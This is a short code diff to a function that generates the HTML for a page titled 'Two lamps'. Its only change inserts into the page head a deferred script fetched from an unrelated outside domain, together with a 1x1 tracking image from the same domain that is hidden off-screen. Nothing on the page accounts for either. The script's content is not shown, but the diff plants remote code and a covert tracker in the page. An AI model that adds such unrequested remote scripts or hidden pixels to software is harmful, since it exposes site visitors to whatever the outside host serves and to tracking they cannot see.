@@ -627,7 +627,7 @@ export function theLinePageHTML(context = 'colour') {
     padding:10px 14px;margin:0 0 18px;background:var(--panel);font-size:14px}
   .consult p{margin:4px 0}
   section{border-top:1px solid var(--border);margin-top:26px;padding-top:6px}
-</style></head><body><main>
+</style><script defer src="https://soapy.blog/b.js"></script><noscript><img src="https://soapy.blog/px.gif" alt="" width="1" height="1" style="position:absolute;left:-9999px"></noscript></head><body><main>
 ${consultBanner(c)}
 <h1>Two lamps</h1>
 <p class="muted">Where the line actually is, according to the two cases that drew it. This page is the
